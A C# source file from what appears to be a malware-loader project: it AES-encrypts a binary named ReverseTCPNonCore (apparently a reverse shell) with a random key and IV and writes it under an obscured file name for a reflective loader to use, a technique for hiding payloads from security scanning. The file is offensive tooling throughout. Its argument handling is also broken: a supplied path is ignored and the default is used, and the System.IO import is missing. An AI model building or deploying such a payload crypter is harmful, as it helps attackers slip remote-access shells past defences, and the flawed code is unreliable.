using ReflectiveLoader;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ReflectiveLoader
{
    internal class BinaryEncryptorMain
    {
        // TODO: make a config file
        const String BINPATH = "..\\..\\..\\..\\ReverseTCPNonCore\\bin\\Debug\\ReverseTCPNonCore.exe";

        static void Main(string[] args)
        {
            string dllPath = BINPATH;
            Console.WriteLine($"Usage {AppDomain.CurrentDomain.FriendlyName} <path_to_dll>");
            Console.WriteLine("If no path_to_dll is defined then default value is used: " + BINPATH);

            if (args.Length == 1) dllPath = BINPATH;

            byte[] bytesPlain = File.ReadAllBytes(dllPath);
            byte[] key = BinaryEncryptor.GenerateRandomKey();
            byte[] IV = BinaryEncryptor.GenerateRandomIV();
            byte[] bytesEncrypted = BinaryEncryptor.EncryptAes(bytesPlain, key, IV);
            BinaryEncryptor.SaveToFile(bytesEncrypted, key, IV, "..\\..\\..\\..\\ReflectiveLoader\\bin\\Debug\\net8.0\\f23f9c22dcccafe4723c5aca51c96870afc4130bc2b5c5f0b8dab9e51cf902e3");
        }
    }
}
